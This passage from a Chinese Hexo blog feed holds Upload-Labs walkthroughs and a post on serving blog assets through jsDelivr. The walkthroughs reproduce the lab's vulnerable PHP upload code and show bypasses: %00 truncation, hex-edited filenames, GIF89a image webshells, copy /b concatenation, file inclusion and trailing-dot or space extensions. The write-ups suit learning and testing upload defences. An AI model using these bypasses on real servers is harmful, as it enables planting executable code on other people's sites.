class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了<code>$_GET[&#39;save_path&#39;]</code>，本题提示也写道</p><p><code>本pass上传路径可控！</code>，就是通过这个GET变量控制上传路径。</p><p>​    这一关的突破方法需要有一些条件：php版本需要低于<code>5.3.29</code>（我使用的是php版本5.3.17的本地靶机），另一个条件是<code>magic_quotes_gpc</code>需要为关闭状态。<code>magic_quotes_gpc</code>的作用官方文档写道：</p><blockquote><p><strong>Warning</strong> 本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</p><p>​      为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。      当 magic_quotes 为 on，所有的 ‘ (单引号)、” (双引号)、\（反斜杠）和 NUL’s 被一个反斜杠自动转义。     </p></blockquote><p>​    使用bp抓包并添加<code>0x00截断</code>，在GET请求中可以使用url编码的截断：<code>%00</code>。贴个自己参考的博客，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3612978.html">截断上传原理剖析</a>。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了<code>$_GET[&#39;save_path&#39;]</code>变量的值，但是我们在这个变量后面添加了<code>0x00截断</code>，所以后面的代码便不会执行，文件也就不会被重命名。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115204109.png"></p><p>​    文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由<code>..../upload/233.php�/5120201115205501.jpg</code>变为<code>..../upload/233.php</code>。完工</p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>​    （windows环境）</p><p>​    这题和上一题差不多一样，就是把<code>$_GET[&#39;save_path&#39;]</code>变成了<code>$_POST[&#39;save_path&#39;]</code>。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过<strong>16进制修改</strong></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115210935.png"></p><p>​    这里我命名为<code>233.phpa</code>是因为方便我在Hex表中找到这句话的位置和修改数据。<code>a</code>的16进制是<code>61</code>，需要改成截断的值：<code>00</code></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211024.png"></p><p>​    上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工</p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>​    （Linux环境）</p><p>​    源码中有关的函数解释：</p><blockquote><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008305573">PHP中pack、unpack的详细用法</a></p><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fread.php">fread()</a></p><p><a target="_blank" rel="noopener" href="https://www.php.net/fclose">fclose()</a></p><p><a target="_blank" rel="noopener" href="https://www.php.net/intval">intval()</a></p></blockquote><p>​    这道题和前面题目都不一样了：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211509.png"></p><p>​    题目说道需要<strong>上传图片马</strong>，然后使用<strong>文件包含漏洞</strong>进行测试，那么我们就先制作图片马。</p><p>​    查看本题的提示<code>本pass检查图标内容开头2个字节！</code>，意思就是只检测文件前面两个字节的标识，贴一个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37414405/article/details/84660148">各种格式图片文件头标识分析</a>，所以这道题只用在上传的文件头部的两个字节处粘贴对应<strong>文件的头标识</strong>即可绕过检测。</p><p>​    以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入<code>GIF89a&lt;?php phpinfo(); ?&gt;</code>，后缀名无所谓了，因为题目只检测前两个字节即可上传。</p><p>​    <strong>还有一种方法制作图片马</strong>：使用windows的<code>copy /b</code>指令，把两个文件进行<del>无缝</del>拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/gaoshi66/article/details/83653143">windows窗口命令——(copy/b)文件无缝拼接隐藏</a>。</p><p>​    别忘了题目中说道了需要<strong>三种后缀都上传成功才算过关！</strong></p><p>​    <strong>上传以后需要使用文件包含进行判定是否执行</strong>，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击<strong>2</strong>的链接进入<code>include.php</code>进行文件包含：网址输入<code>https://...../include.php?file=./upload/8220201116071327.gif</code>，找到php成功执行的页面。这里还有一个小知识点我学到的就是：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xc90/articles/10257402.html">路径中的’.’和’..’还有’./‘和’../‘都是什么意思</a>。完工</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116152417.png"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>​    （Linux环境）</p><p>​    这题提示写道<code>本pass使用getimagesize()检查是否为图片文件！</code>，和上一题不一样的地方就是使用了<code>getimagesize()</code>函数，这个函数的官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.getimagesize.php">getimagesize()</a>，所以这道题就不能用13题的加<strong>文件的头标识</strong>方法绕过，这次要使用上一题中的<code>copy /b</code>指令用一张正常的图片进行拼接还是可以通过的。</p><p>​    PS：听同学说<code>getimagesize()</code>不过是检测了前八个字节，不过我没试。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116155407.png"></p><p>​    因为是拼接的，所以要直接摸到图片最底部查看成功。完工</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>​    （Linux环境）</p><p>​    13、14、15题都是对<strong>文件的头标识</strong>进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用<code>copy /b</code>制作的图片马可以直接通过。</p><p>​    网上搜集过来的资料</p><blockquote><p>png 文件头  89504E470D0A1A0A</p><p>jpg 文件头 89504E470D0A1A0A</p><p>gif 文件头 474946383961</p></blockquote><p>​    这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsDelivr加速静态博客</title>
      <link href="2020/jsDelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"/>
      <url>2020/jsDelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。</p><blockquote><p> CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>在犹豫要不要买的时候，发现了这个东西：<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">jsdelivr</a>，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞</p><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111202508.png"></p><p>​    名字重了是因为我已经创建好了并且使用了以后才来写的博客。</p><h2 id="2-克隆Git仓库到本地"><a href="#2-克隆Git仓库到本地" class="headerlink" title="2. 克隆Git仓库到本地"></a>2. 克隆Git仓库到本地</h2><p>​    在自己电脑建个文件夹然后打开git输入<code>git clone 你仓库的链接</code>，把刚刚创建的仓库拉倒本地方便上传到仓库。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111203733.png"></p><p>廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：<a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/896043488029600/896067008724000">Git简介</a>。</p><h2 id="3-上传需要加速的资源"><a href="#3-上传需要加速的资源" class="headerlink" title="3. 上传需要加速的资源"></a>3. 上传需要加速的资源</h2><p>​    把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git status                    &#x2F;&#x2F;查看状态</span><br><span class="line">git add .                     &#x2F;&#x2F;添加所有文件到暂存区</span><br><span class="line">git commit -m &#39;第一次提交&#39;      &#x2F;&#x2F;把文件提交到仓库</span><br><span class="line">git push                      &#x2F;&#x2F;推送至远程仓库</span><br></pre></td></tr></table></figure><p>​    这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。</p><p>​    接下来是要上传哪些文件，我使用的是<code>butterfly</code>这个主题，<a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">主题github</a>支持一下作者，直接在主题<code>theme/butterfly</code>文件夹下面找到资源文件夹<code>source</code>发现里面都是一些零碎的文件，但是在发布文件夹<code>public</code>下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed/artical/20201111205045.png">    穷人流下了不争气的泪。传！(真加速还得选好服务器)</p><p>​    这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。</p><p>​    做法：配置文件里找到引用的是本地资源的项，然后在生成网站的<code>public</code>文件下找到对应的资源文件。</p><p>我列一下我在配置文件里修改的项：<code>main_css</code>、<code>main</code>、<code>utils</code>、<code>local_search</code>、<code>algolia_js</code>、<code>translate</code>，因为使用的是<code>Valine</code>评论，里面可以设置自定义表情，我也使用这个方法修改了。</p><h2 id="3-获取地址"><a href="#3-获取地址" class="headerlink" title="3. 获取地址"></a>3. 获取地址</h2><p>​    官网首页很清楚的写明了如何获取资源链接</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201111211357.png"></p><p>​    <code>https://cdn.jsdelivr.net/gh/user/repo@version/file</code>，<code>user</code>就是你的github用户名，<code>repo@version</code>，仓库加上版本号，<code>file</code>就是仓库下的路径。</p><p>​    这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接<code>reop@分支名</code>，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。</p><p>​    贴一个我博客首页的壁纸链接：<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png">https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/top_img/83531406_p0.png</a></p><p>​    这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。</p><h2 id="4-引用链接"><a href="#4-引用链接" class="headerlink" title="4. 引用链接"></a>4. 引用链接</h2><p>​    配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了<strong>你现在引用的是之前的上传的静态资源</strong>，别忘啦！别忘啦！别忘啦！</p><p>​    我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。</p><p>​    还有我整理的<code>Valine</code>评论的自定义表情，大伙可以直接拿去用：<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/">图片地址</a>，<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/valine.json">emojimap</a>。完工</p>]]></content>
      
      
      <categories>
          
          <category> 捣腾博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsdelivr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs(二)</title>
      <link href="2020/Upload-Labs2/"/>
      <url>2020/Upload-Labs2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    &#x2F;&#x2F;这里下面是过滤</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.html&quot;, ......);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里下面是移动文件。</span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件类型不允许上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤部分：</p><ul><li><p><code>$deny_ext</code>是一个过滤的后缀数组，只要是在里面的后缀都是被禁止上传的。</p><ul><li><code>$file_name = trim($FILES[&#39;upload_file&#39;][&#39;name&#39;])</code>这段代码有两个点需要说：<ol><li><code>$FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>是获取上传文件的名称，PHP中$FILES是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $FILES 为二维数组；如果为多个文件上传，那么 $FILES 为三维数组。贴一个参考的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/laijinquan/p/8682282.html">PHP $_FILES函数详解</a>。</li><li><code>trim()</code>函数的作用就是去除文件名称前后的空格换行符等。</li></ol></li></ul></li><li><p><code>$file_name = deldot($file_name)</code>这个注释中很清楚，是删除文章末尾的点。</p></li><li><p><code>$file_ext = strrchr($file_name, &#39;.&#39;)</code>中<code>strrchr(string s1,char c1)</code>函数查找字符或字符串c1在另一个字符串s1中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。说白了就是获取文件的后缀名。</p></li><li><p><code>$file_ext = strtolower($file_ext)</code>注释上转换小写。</p></li><li><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>去除字符串::$DATA。第八题讲了原理</p></li></ul><p>上传部分：</p><ul><li><code>in_array($file_ext, $deny_ext)</code>判断文件的后缀(第一个参数)是不是在黑名单数组(第二个参数)中。</li><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。</li><li><code>$img_path = UPLOAD_PATH.&#39;/&#39;.$file_name</code>这个变量是设置需要保存到的路径</li><li><code>move_uploaded_file($temp_file, $img_path)</code>本函数检查并确保指定的文件(第一个参数)是合法的上传文件(即通过 PHP 的 HTTP POST 上传机制所上传的)。如果文件合法，则将其移动为由指定的文件路径(第二个参数)。</li></ul><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件不允许上传&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    看源码发现少了<code>trim()</code>函数<strong>对文件名前后的空格处理</strong>，所以我们可以在上传文件时在后缀名后面添加空格使其成为.php  (有空格)绕过黑名单数组。</p><p><img src="https://s1.ax1x.com/2020/11/09/Bb9jQe.png"></p><p>​    上传以后访问文件执行成功。完工</p><p><img src="https://s1.ax1x.com/2020/11/09/Bb9xLd.png"></p><p>​    这里说明一下，我前面是在<a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a>在线靶场上做的linux环境下的题目，但是这道题用了上面的方法怎么都访问不到，所以我在本地windows环境上搭建了一个靶机进行上传(而且后面有道题必须是在windows环境下才可以通过)。在github上下载的源码题目比在线靶场上的题目多了一道，对应的题目为 在线靶机pass-06–&gt;github下载的pass-07。默认使用的都是linux环境下的题目，有改变会提前说明。</p><p>​    </p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">            $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;此文件类型不允许上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这道题少了<strong>删除文件名末尾的点</strong>，我们可以通过构造<strong>2333.php. .</strong>(末尾加 点 空格 点)，被解析后文件后缀就会成为”. “(一个点一个空格)，可以绕过黑名单，访问的文件名是<code>2333.php. .</code></p><p><img src="https://s1.ax1x.com/2020/11/09/BbCOkq.png"></p><p>​    我又参考了其他博客，讲到windows环境下可以利用系统会自动删除后缀中最后的一个”.”，尝试在windows靶机上测试<strong>只添加一个点</strong>，访问的文件名为<code>2333.php、2333.php.</code>都可以，因为windows会删除最后一个点。</p><p><img src="https://s1.ax1x.com/2020/11/09/BbMywV.png"></p><p><img src="https://s1.ax1x.com/2020/11/09/BbKXq0.png"></p><p>​    两种方式第一个在linux环境下的php服务器上，第二个在windows环境下的php服务器上，上传后都可以成功访问文件。完工</p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload &#x3D; 